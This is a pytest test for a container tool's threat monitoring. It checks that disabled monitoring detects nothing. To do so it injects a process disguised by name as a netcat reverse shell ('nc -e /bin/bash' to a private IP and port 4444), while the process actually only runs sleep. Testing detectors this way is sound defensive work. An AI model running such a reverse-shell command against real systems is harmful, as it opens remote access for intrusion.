"""Test monitoring configuration options."""

import subprocess
import time
from pathlib import Path

import pytest

from support.monitoring import (
    cleanup_container,
    get_container_name_from_workspace,
    get_container_state,
    get_threat_events,
    wait_for_container_running,
)


def test_monitoring_disabled_no_detection(test_workspace, coi_binary):
    """Test that threats are NOT detected when monitoring is disabled."""
    # Create config with monitoring disabled
    # Include network mode = open to prevent network-related issues in CI
    config_path = Path.home() / ".coi" / "config.toml"
    backup = config_path.read_text() if config_path.exists() else None

    config_path.parent.mkdir(parents=True, exist_ok=True)
    config_path.write_text(
        """
[network]
mode = "open"

[monitoring]
enabled = false
"""
    )

    try:
        # Start shell (should respect config with monitoring disabled)
        proc = subprocess.Popen(
            [coi_binary, "shell", "--workspace", test_workspace, "--slot", "13"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-13"

        if not wait_for_container_running(container_name, timeout=30):
            proc.terminate()
            pytest.skip(f"Container {container_name} not found or not running")

        # Inject malicious command (should NOT be detected)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait to see if it would be detected
        time.sleep(10)

        # Container should still be running (no monitoring = no kill)
        state = get_container_state(container_name)
        assert state == "Running", (
            f"Container should stay running when monitoring disabled, got {state}"
        )

        # Verify NO threats logged (audit log shouldn't exist or be empty)
        events = get_threat_events(container_name)
        assert len(events) == 0, (
            f"Expected NO threats when monitoring disabled, found {len(events)}"
        )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    finally:
        # Restore original config
        if backup:
            config_path.write_text(backup)
        elif config_path.exists():
            config_path.unlink()
